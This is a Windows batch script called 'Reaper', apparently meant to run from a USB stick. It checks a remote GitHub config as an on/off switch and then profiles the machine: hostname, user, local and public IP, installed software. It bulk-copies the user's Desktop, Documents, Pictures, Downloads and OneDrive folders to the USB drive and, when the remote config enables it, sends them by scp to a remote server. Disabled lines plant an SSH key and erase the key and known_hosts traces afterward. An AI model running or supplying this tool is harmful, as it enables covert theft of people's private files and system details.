@echo off
setlocal enabledelayedexpansion

:: Set the URL of the configuration file on GitHub
set "configUrl=https://raw.githubusercontent.com/AROA-DEV/Reaper/Testing/Config/Reaper-config.cfg"

:: Fetch the configuration file contents using curl
for /f "delims=" %%i in ('curl -s "%configUrl%"') do (
    :: Check if the line "Active=true" exists in the configuration file
    echo %%i | findstr /i "Active=true" >nul
    if %errorlevel% equ 0 (
        :: The line "Active=true" is found
        echo Configuration file is active. Running the script...
        goto Active
    ) else (
        :: The line "Active=true" is not found or is set to "Active=false"
        echo remote configuration file is not active. Exiting...
        echo.
        :: uncomment the following line to enable local configuration file 
        :: echo cheking for local configuration file...
        :: echo.
        :: goto Local
        sleep 5
        exit /b 0
    )
)

:: The script will only reach this point if the remote configuration file is inaccessible or has an unknown format.
:Local
:: Check if a local configuration file exists
if exist "Reaper-config.cfg" (
    :: Local configuration file exists
    echo Local configuration file found. Checking if it is active...

    :: Check if the line "Active=true" exists in the local configuration file
    findstr /i "Active=true" "Reaper-config.cfg" >nul
    if %errorlevel% equ 0 (
        :: The line "Active=true" is found in the local configuration file
        echo Local configuration file is active. Running the script...
        goto Active
    ) else (
        :: The line "Active=true" is not found or is set to "Active=false" in the local configuration file
        echo Local configuration file is not active. Exiting...
        sleep 5
        exit /b 0
    )
) else (
    :: Local configuration file does not exist
    echo Local configuration file not found. Exiting...
    sleep 5
    exit /b 0
)

:Active
:: Read the remote configuration file
for /f "usebackq tokens=1* delims== " %%a in (`curl -L "%configUrl%"`) do (
 if /i "%%a"=="TARGET_SERVER" (
 :: Get the target server from the remote configuration
 set "target_server=%%b"
 ) else if /i "%%a"=="TARGET_PORT" (
 :: Get the target server port from the remote configuration
 set "target_port=%%b"
 ) else if /i "%%a"=="TARGET_FOLDER" (
 :: Get the target folder path from the remote configuration
 set "target_folder=%%b"
 ) else if /i "%%a"=="COPY_FILES" (
 :: Get the choice to copy files from the remote configuration
 set "CopyFiles=%%b"
 )
)

:: Validate if all the required variables are set
if not defined target_server (
    echo TARGET_SERVER is not set in the remote configuration file.
    exit /b 1
)

if not defined target_port (
    echo TARGET PORT is not set in the remote configuration file. will use default port 22
    set "target_port=22"  :: Set default port to 22 if not specified in the remote configuration
)

if not defined target_folder (
    echo TARGET_FOLDER is not set in the remote configuration file.
    exit /b 1
)

:: set usb leter
:: set /p usb_drive="Please enter the drive letter of your USB: "
FOR /F "tokens=*" %%g IN ('cd') do (SET usb_drive=%%g)
echo %usb_drive%

:: Get machine name
set filename=%USERNAME%.txt
echo Machine Name: %COMPUTERNAME% > %filename%
:: Get logged in account name
echo Logged in Account Name: %USERNAME% >> %filename%
:: Get time and date
echo Time and Date: %TIME% %DATE% >> %filename%
:: Get local IP address
for /f "skip=1 tokens=2 delims=[]" %%a in ('ping %computername% -n 1 -4') do set localIP=%%a
echo Local IP: %localIP% >> %filename%
:: Get public IP address
for /f "skip=1 tokens=2 delims=[]" %%a in ('nslookup myip.opendns.com. resolver1.opendns.com') do set publicIP=%%a
echo Public IP: %publicIP% >> %filename%
:: Get list of installed apps
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s | find "DisplayName" >> %filename%

:: uncomet lines with ":: #deactivated " to activate copying files to SSH server

:: copy the private key to the users .ssh folder
:: #deactivated xcopy /E /Y "%usb_drive%:\id_rsa" "%USERPROFILE%\.ssh\"
:: Set target server
:: #deactivated set target_server=[user]@[ip]
:: Set target server port defoult 22
:: #deactivated set target_port=22
:: set path to target folder
:: #deactivated set target_folder=Reaper-info-retreave/%USERNAME%/
:: Send information to SSH server
:: #deactivated ssh -p %target_port% %target_server% mkdir -p %target_folder%
:: #deactivated scp -P %target_port%  %filename% %target_server%:%target_folder%
:: #deactivated del %filename%

set desktop=%USERPROFILE%\Desktop
set documents=%USERPROFILE%\Documents
set images=%USERPROFILE%\Pictures
set downloads=%USERPROFILE%\Downloads
set onedrive=%USERPROFILE%\OneDrive

:: #deactivated set /p CopyFiles="Do you want to copy the files to the SSH server? (y/n): "
if /i "%CopyFiles%"=="y" (
    ssh -p %target_port% %target_server% mkdir -p %target_folder%Desktop
    scp -P %target_port% -r %desktop% %target_server%:%target_folder%Desktop
    ssh -p %target_port% %target_server% mkdir -p %target_folder%Documents
    scp -P %target_port% -r %documents% %target_server%:%target_folder%Documents
    ssh -p %target_port% %target_server% mkdir -p %target_folder%Images
    scp -P %target_port% -r %images% %target_server%:%target_folder%Images
    ssh -p %target_port% %target_server% mkdir -p %target_folder%Downloads
    scp -P %target_port% -r %downloads% %target_server%:%target_folder%/Downloads
    ssh -p %target_port% %target_server% mkdir -p %target_folder%OneDrive
    scp -P %target_port% -r %onedrive% %target_server%:%target_folder%OneDrive
    echo Files copied successfully!
) 
if /i "%CopyFiles%"=="n" (
    echo Copying files to USB only.
)

:: Delete the private key from the users .ssh folder        
:: #deactivated del "%USERPROFILE%\.ssh\id_rsa"
:: #deactivated del "%USERPROFILE%\.ssh\known_hosts"
:: #deactivated del "%USERPROFILE%\.ssh\known_hosts.old"

set dest_folder="%usb_drive%\%USERNAME%"

md "%dest_folder%"
xcopy /E /Y "%onedrive%" "%dest_folder%\OneDrive\"
xcopy /E /Y "%desktop%" "%dest_folder%\Desktop\"
xcopy /E /Y "%documents%" "%dest_folder%\Documents\"
xcopy /E /Y "%images%" "%dest_folder%\Images\"
xcopy /E /Y "%downloads%" "%dest_folder%\Downloads\"

echo Files copied successfully!

pause